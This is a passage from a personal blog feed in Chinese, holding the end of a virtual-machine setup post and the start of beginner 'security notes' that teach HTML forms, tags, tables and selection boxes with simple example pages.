href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507192055.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507192055.png" alt="img"></a><br>取名随便,下一步<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507192301.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507192301.png" alt="img"></a><br>改为单个文件,容量看自己需求,下一步自定义硬件设置<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507192739.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507192821.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507192821.png" alt="img"></a><br>内存4g,处理器2内核2</p>]]></content>
    
    
    <categories>
      
      <category>CS基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安全笔记2</title>
    <link href="/2023/08/20/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/"/>
    <url>/2023/08/20/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/</url>
    
    <content type="html"><![CDATA[<h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="1-html"><a href="#1-html" class="headerlink" title="1.html"></a>1.html</h2><p>(结合vscode和typora)</p><h3 id="1-基础架构"><a href="#1-基础架构" class="headerlink" title="1. 基础架构"></a>1. 基础架构</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>还是得记笔记<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-常见标签"><a href="#2-常见标签" class="headerlink" title="2. 常见标签"></a>2. 常见标签</h3><table><thead><tr><th>标签名</th><th>介绍</th><th>示例</th></tr></thead><tbody><tr><td>meta</td><td>提供页面源信息(meta-information)(给搜索引擎看的)</td><td><code>&lt;meta name=&quot;author&quot; content=&quot;taosu&quot;&gt;</code></td></tr><tr><td>link</td><td>引入外部链接(这里引入的是一个css)</td><td><code>&lt;link href=&#39;E:\桌面\blog\source\css\custom.css&#39;&gt;</code></td></tr><tr><td>br</td><td>换行</td><td><code>&lt;/br&gt;</code></td></tr><tr><td>hr</td><td>换行线(知乎的分割线)</td><td><code>&lt;/hr&gt;</code></td></tr></tbody></table><table><thead><tr><th>文本属性标签</th><th>介绍</th><th>示例</th></tr></thead><tbody><tr><td>b</td><td>加粗</td><td><code>&lt;b&gt;这是段加粗的文字&lt;/b&gt;</code></td></tr><tr><td>i</td><td>斜体</td><td><code>&lt;i&gt;斜体&lt;/i&gt;</code></td></tr><tr><td>sup</td><td>上标(平方就是上标)</td><td><code>2&lt;sup&gt;3&lt;/sup&gt;=8</code> 23&#x3D;8</td></tr><tr><td>sub</td><td>下标</td><td>同上</td></tr><tr><td>del</td><td>删除线</td><td><code>&lt;del&gt;这段要被删除&lt;/del&gt;</code> <del>这段要被删除</del></td></tr><tr><td>font</td><td>字体属性</td><td><code>&lt;font size=&quot;7&quot; color=&quot;66ccff&quot;&gt;天依蓝&lt;/font&gt; </code>天依蓝</td></tr><tr><td>pre</td><td>预留标签(在网页显示时p会自动帮你缩进,pre不会)</td><td><code>&lt;pre&gt; 空格也会显示&lt;/pre&gt;</code></td></tr></tbody></table><h3 id="3-form表单和input标签"><a href="#3-form表单和input标签" class="headerlink" title="3. form表单和input标签"></a>3. form表单和input标签</h3><p>form表单用于规定向何处以及何种方式发送表单数据<br>一般用post和get,post传的数据更安全且更多<br>action指将数据发往何处,不写时默认发给本页面<br>enctype是编码方式,这个属性只能在post使用,编码后数据更容易进行传输和接收,enctype属性有三个可用的值：</p><ol><li>application&#x2F;x-www-form-urlencoded：这是默认值。在发送前，所有字符都会被编码（空格会被转换为“+”号，特殊字符会被转换为ASCII HEX值）。</li><li>multipart&#x2F;form-data：不对字符进行编码。当使用文件上传控件的表单时，必须使用此值</li><li>text&#x2F;plain：将空格转换为“+”号，但不对特殊字符进行编码。</li></ol><p>type给input标签显示的样式,可以使用type&#x3D;”text”创建文本框，使用type&#x3D;”checkbox”创建复选框(就类似选性别后面的按钮,男●女○这样的)，使用type&#x3D;”radio”创建单选按钮，使用type&#x3D;”submit”创建提交按钮等<br>name是给服务器看的,比如表单输入的是密码,name就可以是password(name都是自定义的),服务器端会接收表单信息,同时建立一个名为password的变量存储提交的密码<br>id是css或js选择用的<br>value是在未输入值时,表单的输入框显示给用户看的内容<br>hidden是隐藏内容,用户在页面看不到,但是value会随着表单数据一起传到服务器,可以避免CSRF(跨站点请求)攻击<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230407152923.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="get"></a><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230407153040.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230407153040.png" alt="post看不见内容,比较安全"></a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>form表单和input标签<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!--账密输入表单--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> &gt;</span><br>用户名:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;enter your name&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;30&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">readonly</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>密码:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;enter your password&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123456&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;重置&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;选择上传的文件&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-a标签-img标签-table表格"><a href="#4-a标签-img标签-table表格" class="headerlink" title="4.a标签,img标签,table表格"></a>4.a标签,img标签,table表格</h3><h4 id="a-anchor-锚"><a href="#a-anchor-锚" class="headerlink" title="a(anchor 锚)"></a>a(anchor 锚)</h4><ol><li><p>self是不跳转,blank是跳转到别的页面</p></li><li><p>书签功能,点击即跳转到网页某处(返回页面最上方)</p><p><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230407164008.png" alt="alt是alternative text,在图片无法显示时可以方便用户了解图片内容"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dingbu&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://fata.taosu0216.cn&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_self&quot;</span>&gt;</span>blog<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://fata.taosu0216.cn&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>blog<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230407134515.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;900&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1300&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;封面&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#dingbu&quot;</span>&gt;</span>click to top<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="table"><a href="#table" class="headerlink" title="table"></a>table</h4><table><thead><tr><th>name</th><th>用处</th></tr></thead><tbody><tr><td>border</td><td>表格宽度(0即不显示表格框)</td></tr><tr><td>cellpadding</td><td>内容与单元格框架距离</td></tr><tr><td>th</td><td>表头</td></tr><tr><td>tr</td><td>一行</td></tr><tr><td>td</td><td>一个单元格</td></tr><tr><td>colspan</td><td>一个单元格占据几个单元格的地方(横向拼接)</td></tr><tr><td>rowspan</td><td>竖向合并单元格</td></tr></tbody></table><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>table<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">cellpadding</span>=<span class="hljs-string">&quot;10&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>第一列<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>第二列<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>qq<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2412211487<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>school<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>qlu<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>job<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>coder<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="5-各种框和文本域"><a href="#5-各种框和文本域" class="headerlink" title="5.各种框和文本域"></a>5.各种框和文本域</h3><table><thead><tr><th>name</th><th>用处</th></tr></thead><tbody><tr><td>filedset</td><td>大边框</td></tr><tr><td>legend</td><td>描述整个边框里的内容</td></tr><tr><td>radio (多选框)</td><td>就是类似在正确选项后面打对钩的操作(只选一个)</td></tr><tr><td>checkbox (复选框)</td><td>很多个选项里选多个打对钩</td></tr><tr><td>checked</td><td>默认勾选</td></tr><tr><td>select(选择框)</td><td>就像微信选地区的那种下拉在很多选项里选一个的</td></tr><tr><td>textarea(文本域)</td><td>有点留言框的感觉</td></tr></tbody></table><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>选择框,复选框,单选框<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filedset</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">legend</span>&gt;</span>个人简介<span class="hljs-tag">&lt;/<span class="hljs-name">legend</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>性别<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>男<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>女<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>喜欢的语言<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;c&quot;</span>&gt;</span>c<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;c++&quot;</span> <span class="hljs-attr">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span>c++<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span>php<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>地区<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;地区&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;北京&quot;</span>&gt;</span>北京<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;上海&quot;</span>&gt;</span>上海<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;广州&quot;</span>&gt;</span>广州<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;深圳&quot;</span>&gt;</span>深圳<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>留言<span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">filedset</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="6-基础列表和嵌入页面"><a href="#6-基础列表和嵌入页面" class="headerlink" title="6.基础列表和嵌入页面"></a>6.基础列表和嵌入页面</h3><table><thead><tr><th>name</th><th>用处</th></tr></thead><tbody><tr><td>ul</td><td>无序列表(前面没有序号)</td></tr><tr><td>ol</td><td>有序列表</td></tr><tr><td>iframe</td><td>嵌入具体页面</td></tr><tr><td>ul{list-style-image:url()}</td><td>设置列表标记的图片,默认是小圆点,小方块或者数字,通过这个可以选择图片当列表标记</td></tr></tbody></table><p>伪类:是特殊的选择器,可以用于选择特殊状态下的元素,比如a:hover {},就是鼠标悬停在a类元素上时会有不同表现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>a:link&#123;<br>font-family:Lucida Handwriting;<br>&#125;<br>a:hover&#123;<br>color:aqua;<br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span 